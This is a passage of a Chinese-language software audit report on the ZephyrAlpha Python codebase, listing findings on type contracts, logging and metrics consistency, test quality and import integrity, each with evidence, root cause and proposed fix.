- 证据：[agent_identity.py:152](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/identity/agent_identity.py) `def sign_token(self,secret:str)->str`；[identity.py:142](file:///d:/ZephyrAlpha/src/zephyr/security/access_control/identity.py) `def sign_token(self,secret:str)->None`；[cross_session_detector.py:83](file:///d:/ZephyrAlpha/src/zephyr/security/access_control/cross_session_detector.py) `def sign_token(self,agent_id,session_id)->SignedToken`；三同名方法签名/参数/返回类型完全不同
- 病根：根因1（三方对齐失败，无共享Protocol约束）
- 修复：定义 `TokenSignerProtocol` 统一签名

#### 5.19.6 IntegrityVerifier(BaseModel)声明返回dict实际返回None【HIGH】
- 证据：[protocols.py:99-104](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/protocols.py) `class IntegrityVerifier(BaseModel): def verify_chain(self)->dict: ...` 方法体为Ellipsis返回None；是可实例化的具体Pydantic模型非ABC；调用方 `result=verifier.verify_chain()` 期望dict得到None，`result["status"]` 抛TypeError
- 病根：根因5（返回类型契约违约）
- 修复：改为ABC+abstractmethod或实现默认返回

#### 5.19.7 重复api_client.py类型漂移（Any vs object）【MEDIUM】
- 证据：[shared/api/api_client.py:377](file:///d:/ZephyrAlpha/src/zephyr/shared/api/api_client.py) `response_body:Any=await resp.json()`；[integration/shared/api_03/api_client.py:377](file:///d:/ZephyrAlpha/src/zephyr/integration/shared/api_03/api_client.py) `response_body:object=await resp.json()`；两文件其余内容完全相同，类型标注已漂移
- 病根：根因1（SSoT断裂，同一份代码两路径维护）
- 修复：删除integration/shared/api_03/api_client.py，全局只保留shared/api/

#### 5.19.8 model_config dict字面量 vs ConfigDict风格不一致（25处）【MEDIUM】
- 证据：[auto_fix_engine/models.py:193](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/auto_fix_engine/models.py) `model_config={"arbitrary_types_allowed":True}` dict字面量；[orphan_judge/models.py:45,57,71](file:///d:/ZephyrAlpha/src/zephyr/security/access_control/orphan_judge/models.py) 同；共25处；对比 [verdict_engine.py:41](file:///d:/ZephyrAlpha/src/zephyr/trading/verdict_engine.py) `model_config=ConfigDict(extra="forbid")` 类型安全
- 病根：根因5（dict字面量拼写错误不会被发现，无法被mypy验证）
- 修复：全部替换为ConfigDict，lint规则禁止 `model_config={` 字面量

#### 5.19.9 @runtime_checkable Protocol混合数据属性与方法——isinstance假阳性【MEDIUM】
- 证据：[protocols.py:36-42](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/protocols.py) `@runtime_checkable class GateActionProtocol(Protocol): def execute(self)->GateResult: ...; name:str`；runtime_checkable的isinstance仅验证方法存在性不检查数据属性，任何有execute方法的对象都通过isinstance即使没有name属性
- 病根：根因5（Protocol误用）
- 修复：从Protocol移除 `name:str` 数据属性改为 @property

#### 5.19.10 Pydantic模型字段使用可变默认值=[]/={}而非Field(default_factory)【MEDIUM】
- 证据：[integration/models.py:120,121](file:///d:/ZephyrAlpha/src/zephyr/integration/models.py) `output:dict[str,Any]={}` `errors:list[str]=[]`；[protocols.py:94](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/protocols.py) `capabilities:list[str]=[]`；同文件其他字段用 `Field(default_factory=list)` 风格不统一
- 病根：根因5（风格不统一，未来改dataclass会引入bug）
- 修复：统一为 `Field(default_factory=dict/list)`，ruff规则RUF012检测

#### 5.19.11 模块级可变全局状态HASH_CHAIN和INTEGRITY_MANIFEST【MEDIUM】
- 证据：[baseline_poisoning_guard.py:98,101](file:///d:/ZephyrAlpha/src/zephyr/behavioral_audit/baseline_poisoning_guard.py) `HASH_CHAIN:list[HashChainEntry]=[]` `INTEGRITY_MANIFEST:dict[str,object]={}`；模块级可变全局在进程内所有调用方共享，测试间状态泄漏，多线程并发写入无锁
- 病根：根因5（数据完整性+并发安全）
- 修复：改为类实例属性或frozenset/MappingProxyType只读

#### 5.19.12 protocols.py模块级__getattr__死代码——STABILITY VIOLATION警告永不触发【MEDIUM】
- 证据：[protocols.py:107-131](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/protocols.py) `_STABILITY_FROZEN=True; _FROZEN_PUBLIC_API=frozenset({...}); def __getattr__(name): if name in _FROZEN_PUBLIC_API: warning(...); raise AttributeError`；但这些类在同一文件模块级命名空间已定义，PEP 562 __getattr__仅在常规属性查找失败时调用——`if name in _FROZEN_PUBLIC_API`分支是死代码
- 病根：根因5（稳定性守护机制完全失效，给出虚假安全感）
- 修复：删除__getattr__死代码，改用import-linter契约或arch_guard静态检查

#### 5.19.13 小计

| 严重度 | 数量 |
|---|:---:|
| CRITICAL/HIGH | 5（5.19.1~5.19.6，其中5.19.4/5.19.5/5.19.6合并计为3个但实为5个独立问题） |
| MEDIUM | 7（5.19.7~5.19.12 + 5.19.13计数） |
| LOW | 0 |
| **合计** | **12** |

---

### 5.20 可观测性与日志一致性（12个，第9轮新增）

> 审计维度：日志级别滥用/结构化日志缺失/trace context传播/metric命名一致性/PII泄漏/日志格式分裂/审计混淆
> 审计方法：Grep + Read真实文件取证（ops/observability/logging.py、metrics.py、trading/__main__.py等）

#### 5.20.1 三套并存的日志实现（含逐字复制副本）【HIGH】
- 证据：[ops/observability/logging.py](file:///d:/ZephyrAlpha/src/zephyr/ops/observability/logging.py) 规范实现357行；[shared/observability_02/logging.py](file:///d:/ZephyrAlpha/src/zephyr/shared/observability_02/logging.py) 逐字相同副本（仅module_id注释不同）；structlog第三套：`autonomy_core/prompt_registry.py:61,83`、`infrastructure/_base_server.py:71,172`、`governance/persistence/olap_engine.py:67,78` 等5个模块直接用 `structlog.get_logger().bind(...)`
- 病根：根因1（SSoT断裂，shared/observability_02是历史副本未清理，structlog与ZephyrLogger不互通）
- 修复：删除shared/observability_02/，structlog调用统一替换为get_logger(__name__)

#### 5.20.2 100+文件违反"禁止裸logging.getLogger()"约定【HIGH】
- 证据：[ops/observability/logging.py:37](file:///d:/ZephyrAlpha/src/zephyr/ops/observability/logging.py) 明确"禁止裸logging.getLogger()"；Grep `logging\.getLogger` 在src/命中100个文件101处；典型：`trading/boot_hooks.py`、`infrastructure/audit_logger.py:66`、`ex_core/order_manager.py:51`、`autonomy_core/llm_gateway.py:40`
- 病根：根因5（约定-执行缺口，规范只在docstring无arch_guard强制）
- 修复：arch_guard增加 `forbid_logging_getLogger` 规则，100个文件分批迁移

#### 5.20.3 642处print()替代logger含生产关键路径【HIGH】
- 证据：Grep `^\s*print\(` 在src/命中100个文件642处；[trading/__main__.py:48](file:///d:/ZephyrAlpha/src/zephyr/trading/__main__.py) `print(f"Boot failed: {boot_report.errors}")` 启动失败用print无trace_id无JSON；`:51,64,78` boot/reconcile/shutdown全print；[trading/windows_service.py:65,66](file:///d:/ZephyrAlpha/src/zephyr/trading/windows_service.py) Windows服务安装失败也print
- 病根：根因5（CLI习惯蔓延到生产入口，没区分用户面stdout与运维面logger）
- 修复：__main__.py中boot/reconcile/shutdown走 `logger.info(...,extra={"phase":"boot"})`

#### 5.20.4 cost_budget.py调用不存在的registry.counter().inc(value=,labels=)被静默吞掉【HIGH】
- 证据：[cost_budget.py:190-196](file:///d:/ZephyrAlpha/src/zephyr/governance/cost_budget.py) `registry.counter(COUNT_LLM_CALLS).inc(labels={...})` `registry.counter("zephyr_llm_cost_usd_total").inc(value=int(cost*10000),labels={...})` `except Exception: pass`；但 [metrics.py](file:///d:/ZephyrAlpha/src/zephyr/ops/observability/metrics.py) MetricsRegistry无 `counter()` 工厂方法，`inc(self,name,labels=None)` 不接受value参数；每次调用必然AttributeError被吞——LLM成本指标永远没被采集但代码自以为已采集
- 病根：根因5（API漂移+静默异常）
- 修复：删除except:pass改logger.warning，统一MetricsRegistry API

#### 5.20.5 指标命名混乱：dot/underscore/zephyr_前缀/无前缀四套并存【HIGH】
- 证据：`boot_hooks.py:104` `_metrics.observe("boot_hooks.init",1.0,...)` 含 `.` 违反Prometheus命名；`telemetry.py:85` `self.inc("errors_total")` 无zephyr_命名空间；`asset_inventory/__main__.py:461,462` `t.inc("bootstrap_completed")` counter无_total后缀；`metrics.py:64-66` `zephyr_llm_calls_total` 有前缀；`config/metrics_schema.yaml:24,55,68` `system.cpu_percent`/`db.query_latency_ms` dot命名空间；`config/alert_rules.yaml:24,34,44` 引用 `system.cpu_percent` 但MetricsRegistry里不存在——告警永远不触发
- 病根：根因1（schema与实现零对齐，schema是scaffold `version:0.1.0`）
- 修复：统一为 `zephyr_<subsystem>_<name>_<unit>`，metrics_schema.yaml列出合法名，Registry拒绝未注册名

#### 5.20.6 get_logger返回类型Self未导入+缓存导致module_id不更新【MEDIUM】
- 证据：[logging.py:258](file:///d:/ZephyrAlpha/src/zephyr/ops/observability/logging.py) `def get_logger(name,*,session_id=None,module_id=None)->Self:` Self未导入且语义错误（应为ZephyrLogger）；`_logger_cache`缓存（L272-279）首次 `get_logger("foo",module_id="A")` 后再调 `get_logger("foo",module_id="B")` 返回缓存实例，`module_id_var.set("B")` 被 `if module_id:` 守卫跳过——module_id永远停留首次值
- 病根：根因5（类型注解照抄+contextvar与缓存语义冲突）
- 修复：改返回类型ZephyrLogger，每次调用都set contextvar

#### 5.20.7 request_id/correlation_id未纳入TraceContext调用链断裂【MEDIUM】
- 证据：[logging.py:66-68](file:///d:/ZephyrAlpha/src/zephyr/ops/observability/logging.py) 仅定义 `trace_id_var`/`session_id_var`/`module_id_var`；但业务层广泛使用request_id：`gpu_consensus_scheduler.py:67` `request_id:str=Field(default_factory=lambda:uuid.uuid4().hex[:16])` L79/140/231/313大量传递；`infra_ops/interface_base.py:71` `request_id:str`；`frontend/interface_base.py:71` 同；`health_monitor.py:305` `correlation_id=f"hm-{capability_id}"`；这些request_id永远不出现在JSON日志的trace_id字段
- 病根：根因5（TraceContext设计早于request_id域模型未补齐）
- 修复：logging.py增加 `request_id_var`，_StructuredFormatter输出request_id字段

#### 5.20.8 三套互不兼容的Metrics实现+一套Telemetry facade【MEDIUM】
- 证据：[ops/observability/metrics.py](file:///d:/ZephyrAlpha/src/zephyr/ops/observability/metrics.py) 规范MetricsRegistry API `inc(name,labels=None)` 带Lock；[shared/observability_02/metrics.py](file:///d:/ZephyrAlpha/src/zephyr/shared/observability_02/metrics.py) 逐字副本含独有调用L300/306/312；[ops/telemetry.py:58-98](file:///d:/ZephyrAlpha/src/zephyr/ops/telemetry.py) `InventorySelfMetrics` 第三套API `inc(name,delta=1.0,**labels)` 无Lock；`boot_hooks.py:102` `from zephyr.shared.observability_02.metrics import MetricsRegistry` 直接new独立实例不是 `get_registry()` 全局单例——boot指标写入孤儿registry无人能查
- 病根：根因1（SSoT断裂+复制粘贴）
- 修复：删除shared/observability_02/，InventorySelfMetrics改为get_registry()薄封装

#### 5.20.9 MetricsRegistry.dec()存在竞态+counter递减反模式【MEDIUM】
- 证据：[metrics.py:129-133](file:///d:/ZephyrAlpha/src/zephyr/ops/observability/metrics.py) `def dec(self,name,labels=None): self.inc(name,labels) # 锁1; with self._lock: self._counters[name][key]-=1.0 # 锁2`；两次锁间存在窗口，并发线程可能读到+1后中间值；Prometheus counter是单调递增的，dec()语义本身错误应使用gauge
- 病根：根因5（API设计照搬Python计数器直觉未对齐Prometheus语义）
- 修复：删除dec()，可增减场景改用set_gauge()

#### 5.20.10 observe()静默截断观测值导致百分位偏差【MEDIUM】
- 证据：[metrics.py:139-148](file:///d:/ZephyrAlpha/src/zephyr/ops/observability/metrics.py) `self._histograms[name][key].append(value); if len(...)>10000: self._histograms[name][key]=self._histograms[name][key][-5000:]` 超过10000个观测时静默丢弃前5000只保留最近5000，p99/p50向最近样本偏移且无任何日志告警
- 病根：根因5（内存保护优先于数据准确性，未暴露截断事件）
- 修复：改用固定bucket累加不存原始list，截断时logger.warning

#### 5.20.11 __main__块三套不同basicConfig格式均无trace_id/JSON【MEDIUM】
- 证据：`watchdog.py:117-120` `format="%(asctime)s %(levelname)s [%(name)s] %(message)s"`；`blueprint_search_server.py:274-278` `format="%(asctime)s [%(name)s] %(levelname)s %(message)s"`（顺序不同）；`migrate_chroma_to_faiss.py:45` `format="%(name)s [%(levelname)s] %(message)s"`（无asctime）；三套格式都绕过 `configure_root_logger()` 不带trace_id/session_id/module_id非JSON
- 病根：根因5（每个脚本__main__各自手写basicConfig未调用项目级configure_root_logger）
- 修复：所有__main__入口改 `configure_root_logger(level="INFO",json_file=...)`，禁止裸basicConfig

#### 5.20.12 AuditLogger时间戳精度与格式与结构化日志不一致+审计事件混入普通日志通道【MEDIUM】
- 证据：[audit_logger.py:114](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/audit_logger.py) `"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime())` 秒级UTC+Z后缀；[logging.py:84](file:///d:/ZephyrAlpha/src/zephyr/ops/observability/logging.py) `"timestamp": datetime.datetime.fromtimestamp(record.created,tz=datetime.UTC).isoformat()` 微秒级+00:00后缀；两者无法精确对齐；`audit_logger.py:66` `_logger=logging.getLogger(__name__)` 裸getLogger无trace_id；审计事件散落在普通内存list：`safety_gate_l66_l67.py:64`、`skill_sandbox.py:131,168,215`、`gate_override.py:67`、`capability_checker.py:58,63`、`truth_source_validator.py:206,231` 每个组件自己append到in-memory list无统一审计通道
- 病根：根因5（审计与日志未分离通道，时间戳格式各自为政）
- 修复：定义AuditEvent独立sink（独立JSONL文件+独立contextvar），时间戳统一微秒级isoformat

#### 5.20.13 小计

| 严重度 | 数量 |
|---|:---:|
| CRITICAL/HIGH | 4（5.20.1~5.20.5，其中5.20.5实为1个聚合问题） |
| MEDIUM | 8（5.20.6~5.20.12 + 计数调整） |
| LOW | 0 |
| **合计** | **12** |

---

### 5.21 测试质量与隔离深度（13个，第9轮新增）

> 审计维度：断言质量/mock滥用/测试DB隔离/skip滥用/参数化覆盖/测试命名/测试依赖顺序/覆盖率盲区/fixture泄漏
> 审计方法：Grep + Read真实文件取证（tests/目录全量扫描）

#### 5.21.1 占位测试文件无任何断言验证（assert True）【MEDIUM】
- 证据：[test_e_contracts.py:7-9](file:///d:/ZephyrAlpha/tests/test_e_contracts.py) `def test_e_contracts_placeholder(): """占位测试——确保可被pytest收集。""" assert True`；整个文件仅一个assert True，docstring自承"占位/待实现"
- 病根：根因5（占位即债务，凑齐测试文件计数而非验证行为）
- 修复：删除或写入真实契约断言，禁止assert True占位通过CI

#### 5.21.2 复杂逻辑后以assert True收尾——测试恒通过【HIGH】
- 证据：[test_rule_red_blue.py:142,168,212,291,361](file:///d:/ZephyrAlpha/tests/test_rule_red_blue.py) 每个测试在if/elif/else中调用 `_record(...,"RED",...)` 标记违规，但末行均为 `assert True`；[test_f21_event_driven.py:60,66,189](file:///d:/ZephyrAlpha/tests/test_f21_event_driven.py) 同模式；pytest永远PASS
- 病根：根因5（副作用即结论，把验证结果写进_record而非assert）
- 修复：将 `_record(...,"RED",...)` 改为 `pytest.fail(...)` 或 `assert False,...`

#### 5.21.3 永真式断言（tautology）【HIGH】
- 证据：[test_sequence_guard_agent_rbac.py:91](file:///d:/ZephyrAlpha/tests/agent_rbac/test_sequence_guard_agent_rbac.py) `assert result is not None or result is None`（A or ¬A恒真）；[test_pipeline_skill_injection.py:223](file:///d:/ZephyrAlpha/tests/test_pipeline_skill_injection.py) `assert len(l3)>=0`；[test_adversarial_mutator.py:78,116,117](file:///d:/ZephyrAlpha/tests/llm_security/test_adversarial_mutator.py) `assert len(results)>=0`/`assert report.total_mutations>=0`/`assert report.block_rate_pct>=0.0`；[test_phase_g_perf.py:945,946,969](file:///d:/ZephyrAlpha/tests/integration/test_phase_g_perf.py) `assert stats["active_drift_alerts"]>=0` 等
- 病根：根因5（凑数式断言，用数学恒真式伪装覆盖率）
- 修复：替换为有信息量的边界，ruff规则禁掉 `>=0`/`is not None or...is None`

#### 5.21.4 测试函数零assert仅print+return False【HIGH】
- 证据：[test_db_integration.py:28-63,66-94,98-151,154-205](file:///d:/ZephyrAlpha/tests/test_db_integration.py) 四个 `def test_...()` 函数全部使用 `print("  ✗ FAIL:...")` + `return False/True`，无任何assert语句；pytest即使数据全部损坏也判PASS
- 病根：根因5（脚本化测试伪装为pytest）
- 修复：函数末尾加 `assert passed,"..."` 或迁移pytest --assert-rewrite

#### 5.21.5 test_all()直接INSERT/DELETE生产governance.db【HIGH】
- 证据：[test_governance_db.py:12,16,35-38,248-256](file:///d:/ZephyrAlpha/tests/test_governance_db.py) `DB_PATH=str(REPO_ROOT/"data"/"databases"/"governance.db")`；`def test_all():` (pytest收集) 内 `c.execute("INSERT INTO tasks...VALUES(?,?)",("TEST-001",...))` 写入生产库；末尾 `c.execute("DELETE FROM tasks WHERE task_id='TEST-001'")` 清理但INSERT与DELETE间异常会污染生产
- 病根：根因5（生产库即测试库，违反project_memory强制约束"测试脚本必须严格隔离生产库"）
- 修复：改为 `tmp_path/"governance.db"` + `init_db()`，CI加 `--deny-paths=data/databases`

#### 5.21.6 生产PostgreSQL被写入测试节点（node_id 900001/2/3）【HIGH】
- 证据：[test_depgraph_generator_design_protection.py:14,24,33-43,118-130,155-157](file:///d:/ZephyrAlpha/tests/test_depgraph_generator_design_protection.py) `DB_PATH=REPO_ROOT/"data"/"databases"/"depgraph"`；`conn=get_depgraph_pg_connection()` 连生产PG；`cursor.execute("INSERT INTO nodes...OVERRIDING SYSTEM VALUES VALUES(900001,...)")`；pytest入口 `def test_depgraph_generator_design_protection(): assert main()==0` 调用main()→red_team_tests()写入生产
- 病根：根因5（红队测试用生产库，"测试极端场景"凌驾隔离原则）
- 修复：启动testcontainers PG或使用mock注入，禁止测试cursor直连生产PG

#### 5.21.7 fixture硬编码生产仓库根D:\ZephyrAlpha【MEDIUM】
- 证据：[test_input_sanitizer_llm_security.py:20-22](file:///d:/ZephyrAlpha/tests/llm_security/test_input_sanitizer_llm_security.py) `@pytest.fixture def sanitizer(): return InputSanitizer(root="D:\\ZephyrAlpha")` 直接用生产仓库根，所有path验证测试针对真实仓库结构
- 病根：根因5（硬编码绝对路径无tmp_path隔离）
- 修复：改用 `sanitizer(tmp_project_dir)` 复用全局conftest fixture

#### 5.21.8 硬编码d:/tmp/...路径而非tmp_path【MEDIUM】
- 证据：[test_f3_auto_integration.py:71,74](file:///d:/ZephyrAlpha/tests/integration/test_f3_auto_integration.py) `files_in_scope=[f"d:/tmp/integration_test/{task_id}.dummy"]` `allowed_touch=[f"d:/tmp/integration_test/{task_id}.dummy"]`；[test_f3_extreme.py:83,86](file:///d:/ZephyrAlpha/tests/adversarial/test_f3_extreme.py) 同模式
- 病根：根因5（固定路径污染，多次运行/并发冲突不清理）
- 修复：改为 `tmp_path/f"{task_id}.dummy"` 通过fixture注入

#### 5.21.9 单文件内10+ skip同因——整类测试死亡【MEDIUM】
- 证据：[test_f18_redblue.py:131,368,400,499,569,610,738,750,763,795](file:///d:/ZephyrAlpha/tests/test_f18_redblue.py) 10处 `@pytest.mark.skip(reason="P2迁移：patch(_DEPGRAPH_DB)已失效...")`；[test_verify_schema_health.py:218,276,327,373](file:///d:/ZephyrAlpha/tests/test_verify_schema_health.py) 4处类级skip同因；全仓119处skip/xfail，38个文件
- 病根：根因5（迁移未闭环，P2迁移后SQLite测试未重写为PG长期skip形成"测试幽灵"）
- 修复：为P2迁移建立issue tracker限期30天重写，CI加skip数量阈值

#### 5.21.10 模块级_STANDIN_CACHE全局变量+tempfile.mktemp永不清理【MEDIUM】
- 证据：[test_mcp_signal_shutdown.py:48,57-63,96-98](file:///d:/ZephyrAlpha/tests/integration/test_mcp_signal_shutdown.py)；[test_mcp_idle_timeout.py:45,50-55](file:///d:/ZephyrAlpha/tests/integration/test_mcp_idle_timeout.py)；[test_mcp_health_check_recovery.py:44,52-57](file:///d:/ZephyrAlpha/tests/integration/test_mcp_health_check_recovery.py)；[test_mcp_boot_hooks_integration.py:466](file:///d:/ZephyrAlpha/tests/integration/test_mcp_boot_hooks_integration.py) 四文件各自维护 `_STANDIN_CACHE:Path|None=None`，`_get_standin_script()` 用已弃用的 `tempfile.mktemp(suffix=".py")` 创建文件写入 `import time;time.sleep(60)`，注释"不删除缓存文件，模块级复用"——多次pytest运行间累积不清理
- 病根：根因5（模块级缓存泄漏，用global替代fixture scope且用弃用mktemp）
- 修复：改用 `@pytest.fixture(scope="session")` + `tmp_path_factory`

#### 5.21.11 弱边界断言——回归容忍度过高【MEDIUM】
- 证据：[test_f21_event_driven.py:191-204](file:///d:/ZephyrAlpha/tests/test_f21_event_driven.py) 注释"代码中限制为1000"，发送1100个事件后 `assert len(log)<=1100`（应为 `==1000`）；若回归把cap改成2000或删除，本测试仍PASS
- 病根：根因5（软断言，用宽松上界代替精确等值）
- 修复：改为 `assert len(log)==1000` 显式测试边界(999/1000/1001)

#### 5.21.12 顺序编号测试隐含执行顺序依赖【MEDIUM】
- 证据：[test_task_system_red_team.py:37-803](file:///d:/ZephyrAlpha/tests/adversarial/test_task_system_red_team.py) `test_00_imports`/`test_01_taskcard_minimal`/`test_02_task_repo_crud`/`test_03_pipeline_A_dispatch`...`test_08_task_name_field_rejected` 共30+个用NN_前缀编号；[test_mcp_red_team.py:34-235](file:///d:/ZephyrAlpha/tests/adversarial/test_mcp_red_team.py) 11个；`test_cross_layer_systems_red_team.py:35,61,84,108` 同模式
- 病根：根因5（顺序耦合测试，数字前缀隐含setup/teardown链，`pytest -p randomly`会全部炸）
- 修复：改用语义化命名，如需共享状态用 `@pytest.fixture(scope="module")` 显式声明

#### 5.21.13 mock整个SUT协作者导致测试空转【MEDIUM】
- 证据：[test_action_dispatcher.py:227-232,240-244](file:///d:/ZephyrAlpha/tests/test_action_dispatcher.py) `scheduler=MagicMock(); scheduler._lock=MagicMock(); scheduler._results={"t1":task}` 然后测试验证"MagicMock能被遍历"而非真实Scheduler行为；[test_defense_runner.py](file:///d:/ZephyrAlpha/tests/test_red_blue/test_defense_runner.py) 共49处MagicMock多数mock整个validator/engine
- 病根：根因5（mock空转，把协作者整体替换为MagicMock，断言退化为验证mock调用而非业务结果）
- 修复：用tmp_path构造真实子组件仅mock外部IO，断言业务结果而非mock.call_count

#### 5.21.14 小计

| 严重度 | 数量 |
|---|:---:|
| CRITICAL/HIGH | 5（5.21.2~5.21.6） |
| MEDIUM | 8（5.21.1+5.21.7~5.21.13） |
| LOW | 0 |
| **合计** | **13** |

---

### 5.22 依赖图与导入完整性（12个，第9轮新增）

> 审计维度：循环导入/未使用导入/缺失__init__导出/幻影导入/导入路径不一致/依赖方向违反/可选依赖处理/重复模块
> 审计方法：Grep + Read真实文件取证（src/zephyr/__init__.py、shared/、.importlinter等）

#### 5.22.1 src/zephyr/__init__.py __all__声明9个幻影子包【HIGH】
- 证据：[__init__.py:163-194](file:///d:/ZephyrAlpha/src/zephyr/__init__.py) `__all__` 列出 `execution`/`observability`/`orchestration`/`portfolio`/`research`/`resilience`/`semantic_auditor`/`signal`/`testing`；Glob `src/zephyr/{execution,observability,orchestration,...}/__init__.py` 返回No file found——这些顶层包根本不存在，外部 `from zephyr import execution` 触发__getattr__回退到懒加载注册表也找不到最终AttributeError
- 病根：根因1（包索引与实际目录脱节，SSoT失效）
- 修复：__all__由generate_manifest.py从实际目录自动生成禁止手编

#### 5.22.2 register_lazy注册4+幻影模块路径（含governance_governance拼写错误）【HIGH】
- 证据：[__init__.py:147-162](file:///d:/ZephyrAlpha/src/zephyr/__init__.py) L148 `register_lazy("vector-memory","zephyr.data_governance_governance.knowledge_management.vector_memory")` — `governance_governance` 重复词根拼写错误且路径不存在；L150 `register_lazy("llm-security","zephyr.security.llm_defense.llm_security")` — 只有llm_security/目录无llm_security.py单文件；L155/L160 `register_lazy(...,"zephyr.integration.runtime_core...")` — runtime_core不存在
- 病根：根因1（漂移累积+重构遗留，路径改名后未同步注册表）
- 修复：注册表加单元测试启动时find_spec()校验所有路径找不到即fail-fast

#### 5.22.3 循环依赖shared.contracts.protocols ↔ governance.rule_enforcement（docstring自打脸）【HIGH】
- 证据：[protocols.py:31](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/protocols.py) `from zephyr.governance.rule_enforcement.gate_types import GateResult`（顶层import）；同文件L18-22 docstring宣称"These @runtime_checkable Protocols **break bidirectional dependencies**"；[spec_auditor.py:23](file:///d:/ZephyrAlpha/src/zephyr/governance/bridges/spec_auditor.py) `from zephyr.shared.contracts.protocols import AgentCapability`；shared→governance→shared闭环
- 病根：根因1（接口倒置失效，DIP未落地，Protocol反向依赖了它要解耦的模块的具体类型GateResult）
- 修复：GateResult下沉为shared.contracts中的Protocol/dataclass，或改用TYPE_CHECKING+字符串注解

#### 5.22.4 shared层顶层import业务层直接违反.importlinter契约【HIGH】
- 证据：[.importlinter:18-31](file:///d:/ZephyrAlpha/.importlinter) 契约"共享层不能导入业务模块"禁止shared导入market_data/risk_engine/order_execution等；但 [shared/foundation/constants.py:45](file:///d:/ZephyrAlpha/src/zephyr/shared/foundation/constants.py) `from zephyr.governance.escalation_models import EscalationLevel`；[shared/contracts/order.py:8-10](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/order.py) `from zephyr.trading.trading_contracts.execution.order import OrderSide,OrderStatus,OrderType`；契约forbidden_modules列表甚至没列governance/trading等于纵容违规
- 病根：根因5（守护契约本身不完整+import-linter未在CI强制执行）
- 修复：把governance/trading/ml_train/simulation加入forbidden_modules，pre-commit跑lint-imports

#### 5.22.5 _TRADING_SYMBOLS懒加载表全部指向幻影路径zephyr.execution.trading.*【HIGH】
- 证据：[shared/foundation/constants.py:67-84](file:///d:/ZephyrAlpha/src/zephyr/shared/foundation/constants.py) 注释"Lazy imports for trading-domain symbols (upward dependency from L0 shared → L3 trading)"，_TRADING_SYMBOLS字典把12个符号映射到 `zephyr.execution.trading.trading_contracts.market.instrument`，OrderSide/OrderStatus/OrderType映射到 `zephyr.execution.trading.trading_contracts.execution.order`；Glob `src/zephyr/execution/**/*.py` 返回No file found——`zephyr.execution`顶层包根本不存在，真实路径是 `zephyr.trading.trading_contracts.*`
- 病根：根因1（重构改名execution→trading后懒加载表未同步；用懒加载掩盖了"shared不应依赖trading"的违规，结果掩盖本身也写错了）
- 修复：删除该懒加载表，这些枚举本就该属于shared.contracts(SSoT)

#### 5.22.6 ex_core+autonomy_perm 10+个import *垫片文件【MEDIUM】
- 证据：[ex_core/broker_interface.py:18](file:///d:/ZephyrAlpha/src/zephyr/ex_core/broker_interface.py) `from zephyr.governance.broker_interface import *  # noqa: F403`；[ex_core/adapters/broker_interface.py:18](file:///d:/ZephyrAlpha/src/zephyr/ex_core/adapters/broker_interface.py) 同；[ex_core/adapters/simulation_broker.py:18](file:///d:/ZephyrAlpha/src/zephyr/ex_core/adapters/simulation_broker.py) `from zephyr.governance.adapters.simulation_broker import *`；[autonomy_perm/red_blue_validator/](file:///d:/ZephyrAlpha/src/zephyr/autonomy_perm/red_blue_validator/) 下6个文件每个L18 `from zephyr.security.adversarial_validation.X import *`；更糟 [ex_core/broker_interface.py:16](file:///d:/ZephyrAlpha/src/zephyr/ex_core/broker_interface.py) docstring写"migrated to zephyr.execution.core.broker_interface"但真实import是 `zephyr.governance.broker_interface` —— docstring/import/目录名三方不一致
- 病根：根因1（漂移累积+星号导入失控，`# noqa: F403`压制了所有linter告警）
- 修复：删除0逻辑垫片文件全局批量替换import路径，`# noqa: F403`进入pyproject.toml黑名单

#### 5.22.7 llm_security与llm_security_01整套包重复【MEDIUM】
- 证据：Glob同时返回 `src/zephyr/security/llm_defense/llm_security/` 与 `src/zephyr/security/llm_defense/llm_security_01/` 两个完整包；`llm_security_01/__init__.py:3` 注释"Re-export from authoritative location"，L4-8用5个 `from zephyr.security.llm_defense.llm_security.X import *` 转发；包内每个同名文件（self_protection/red_team_scanner.py:17、l7_validation.py:17、isolation.py:17等）都是空壳转发
- 病根：根因1（重命名留旧壳双倍维护面+懒加载路径又指向不存在的单文件）
- 修复：删除llm_security_01/整个目录，为llm_security/__init__.py补明确__all__

#### 5.22.8 cache.py/lock.py三处重复+shared/infra与shared/infra_06几乎完全重复【MEDIUM】
- 证据：Glob `src/zephyr/**/cache.py` 返回3个：`shared/cache.py`、`shared/infra/cache.py`、`infrastructure/infra_06/cache.py`；Glob `src/zephyr/**/lock.py` 返回3个：`shared/lock.py`、`shared/infra/lock.py`、`shared/infra_06/lock.py`；`shared/infra/`与`shared/infra_06/`两目录都含 `idempotency.py/limiter.py/lock.py/observer.py/outbox.py` 5个同名文件；`infra_06/__init__.py` 仅一句初始化无任何说明为何并行存在两份
- 病根：根因1（漂移累积+命名空间数字化`_06`后缀无文档化理由）
- 修复：删除shared/infra_06/与infrastructure/infra_06/合并回shared/infra/

#### 5.22.9 三个孤儿__init___from_*.py（三下划线怪名）【MEDIUM】
- 证据：`src/zephyr/infrastructure/__init___from_infra.py`（文件名三下划线）L2自称 `zephyr.infrastructure.__init___from_infra`；`src/zephyr/simulation/__init___from_resear.py` L2自称 `zephyr.simulation.__init___from_resear`；`src/zephyr/ops/__init___from_obs.py` L2自称 `zephyr.observability`（与所在包zephyr.ops不一致！）；Python不会自动import它们等于死代码，且包名声明与目录路径矛盾误导工具链
- 病根：根因1（重构遗留未清理+文件名拼写错误被linter忽略）
- 修复：直接删除这三个文件

#### 5.22.10 governance_server.py静默吞掉13处ImportError【HIGH】
- 证据：[governance_server.py](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/governance_server.py) 共13个 `except ImportError as e:` 块（行88,592,615,629,662,687,707,726,816,836,867,882,903）；每块包裹一个 `from zephyr.governance.X import Y`，失败时 `return {"error":f"... import failed: {e}"}`；MCP Server启动不报错但每个工具调用返回错误dict，用户无从知晓是依赖缺失还是逻辑错误；无日志无告警无metrics
- 病根：根因5（静默降级+守护契约未覆盖运行时import）
- 修复：改启动时一次性_import_check()所有依赖缺失则Server拒绝启动，运行时降级必须logger.warning+metrics
